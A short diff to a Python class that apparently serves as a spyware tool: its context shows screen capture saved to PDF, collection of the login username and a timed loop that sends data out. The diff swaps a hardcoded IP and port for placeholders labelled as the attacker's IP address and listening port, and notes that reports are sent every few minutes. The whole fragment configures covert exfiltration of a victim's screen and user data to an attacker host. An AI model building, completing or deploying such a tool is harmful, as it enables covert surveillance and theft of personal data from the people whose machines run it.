@@ -40,8 +40,8 @@ class lrygg:
         self.scrwid = self.scrsi.width
         self.scrhei = self.scrsi.height
         self.stop_flag = False
-        self.ipadd = '192.168.117.136'
-        self.portn = 42143
+        self.ipadd = '#Your(attacker's ip address'
+        self.portn = #listening port number
         
     def pdfdoc(self):
         self.c = canvas.Canvas(self.pdfpath, pagesize=(self.scrwid, self.scrhei))
@@ -144,7 +144,7 @@ Username: {os.getlogin()}\n
             print(f"Error: {e}")
 
     def driver(self):
-        periodic_rep = 1  # Periodic repetition of code or file to be sent
+        periodic_rep = 1  # Periodic repetition of code or file to be sent(in minutes)
         while True:
             start_time = time.time()
             self.REQdat()
